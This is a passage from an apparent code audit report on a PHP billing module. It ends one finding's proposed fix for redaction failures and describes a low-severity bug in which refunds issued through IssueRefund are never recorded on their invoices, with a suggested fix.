**Proposed fix.** Treat a null from preg_replace as a redaction failure, not a no-op: fall back to replacing the whole value with the placeholder (fail closed) and log the pattern index. Optionally cap the length redactString will process, and anchor the PEM pattern with a bounded body length.

---

## LOW — A refund issued through IssueRefund can never be recorded on its invoice: the pre-set invoice_id is mistaken for a redelivery marker

**Dimension:** Payment integrity, webhooks and money movement  
**Location:** `apps/control-plane/src/Modules/Billing/Application/Actions/RecordInvoiceRefund.php:61`

IssueRefund creates the refund row with invoice_id already populated, and RecordInvoiceRefund uses that same column as its 'already recorded' marker — so the first and only booking of a genuine refund returns early and amount_refunded_minor never moves.

**What it gets an attacker.** Not attacker-driven; it is silent accounting loss. IssueRefund writes `'invoice_id' => $invoiceId ?? $transaction->invoice_id` (line 154 via reserve(), defaulted at line 64), so every refund against a settled capture is born attached. RecordInvoiceRefund::attach() then sees `$locked->invoice_id === $invoice->getKey()` and returns false; `$firstRecording` is false and the action returns the invoice untouched. The money has left the platform through the provider, but the invoice keeps amount_refunded_minor = 0, the generated amount_due_minor still reads zero, the status stays Paid and never reaches Refunded, and the service is never reclaimed. Reporting understates refunds by their full value. The existing suite misses it because InvoiceVoidAndRefundTest::refundRow() hand-builds detached refunds — the one shape IssueRefund never produces. Latent today: no listener wires RefundIssued to RecordInvoiceRefund yet, so this fires the moment that hop is added.

**Proposed fix.** Stop overloading invoice_id as the idempotency marker. Either have IssueRefund leave invoice_id null and let RecordInvoiceRefund be the only writer of it, or give refunds an explicit `recorded_on_invoice_at` (or a unique (invoice_id, refund_id) ledger row) that RecordInvoiceRefund sets and checks.

**Demonstration.** `apps/control-plane/tests/Feature/Security/IssuedRefundIsNeverRecordedOnTheInvoiceTest.php` (not committed — see above)

---

